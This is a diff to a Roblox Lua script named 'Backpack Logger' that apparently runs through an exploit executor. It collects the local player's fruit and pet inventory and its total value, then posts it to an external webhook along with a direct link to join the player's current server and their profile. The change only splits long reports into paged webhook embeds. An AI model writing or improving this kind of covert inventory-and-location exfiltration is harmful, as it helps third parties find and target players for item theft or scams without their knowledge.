@@ -95,7 +95,28 @@ task.defer(function()
 		return math.floor(baseSellPrice * weightMultiplier * levelMultiplier)
 	end
 
-	local function ScanAndSend()
+	local function splitTextIntoChunks(baseLines, maxChars)
+    	local chunks = {}
+    	local chunk, charCount = {}, 0
+    
+    	for _, line in ipairs(baseLines) do
+    		local len = #line + 1 -- add newline char
+    		if (charCount + len) > maxChars then
+    			table.insert(chunks, chunk)
+    			chunk, charCount = {}, 0
+    		end
+    		table.insert(chunk, line)
+    		charCount += len
+    	end
+    
+    	if #chunk > 0 then
+    		table.insert(chunks, chunk)
+    	end
+    
+    	return chunks
+    end
+    
+    local function ScanAndSend()
     	local fruitLines = {
     		"🍎 Fruits            | Value",
     		"---------------------|--------"
@@ -135,35 +156,40 @@ task.defer(function()
     		return
     	end
     
-    	local lines = {}
+    	local contentLines = {}
+    
     	if #fruitLines > 2 then
-    		for _, line in ipairs(fruitLines) do table.insert(lines, line) end
-    		table.insert(lines, "") -- Spacer
+    		for _, line in ipairs(fruitLines) do table.insert(contentLines, line) end
+    		table.insert(contentLines, "")
     	end
     	if #petLines > 2 then
-    		for _, line in ipairs(petLines) do table.insert(lines, line) end
-    		table.insert(lines, "") -- Spacer
+    		for _, line in ipairs(petLines) do table.insert(contentLines, line) end
+    		table.insert(contentLines, "")
     	end
     
-    	table.insert(lines, "Total Backpack Value: $" .. FormatNumber(totalValue))
+    	table.insert(contentLines, "Total Backpack Value: $" .. FormatNumber(totalValue))
     
-    	local description = string.format(
-    		"✅ [Join Server](https://www.roblox.com/games/%s?jobId=%s)\n🔗 [View Profile](https://www.roblox.com/users/%s/profile)\n```txt\n%s\n```",
-    		game.PlaceId,
-    		game.JobId,
-    		LocalPlayer.UserId,
-    		table.concat(lines, "\n")
-    	)
+    	local messageChunks = splitTextIntoChunks(contentLines, 1900) -- 1900 for buffer
     
-    	local payload = HttpService:JSONEncode({
-    		username = "Backpack Logger",
-    		embeds = {{
-    			title = LocalPlayer.Name .. "'s Backpack",
-    			description = description,
+    	local embeds = {}
+    	for i, chunk in ipairs(messageChunks) do
+    		local desc = string.format(
+    			"✅ [Join Server](https://www.roblox.com/games/%s?jobId=%s)\n🔗 [View Profile](https://www.roblox.com/users/%s/profile)\n```txt\n%s\n```",
+    			game.PlaceId,
+    			game.JobId,
+    			LocalPlayer.UserId,
+    			table.concat(chunk, "\n")
+    		)
+    
+    		table.insert(embeds, {
+    			title = LocalPlayer.Name .. "'s Backpack" .. (#messageChunks > 1 and (" (Page " .. i .. ")") or ""),
+    			description = desc,
     			color = 0x00ff99,
     			timestamp = DateTime.now():ToIsoDate()
-    		}}
-    	})
+    		})
+    	end
+    
+    	local payload = HttpService:JSONEncode({ username = "Backpack Logger", embeds = embeds })
     
     	local success, result = pcall(function()
     		return req({
@@ -180,6 +206,7 @@ task.defer(function()
     		warn("❌ Webhook failed:", result)
     	end
     end
+
 
 	task.wait(2)
 	ScanAndSend()
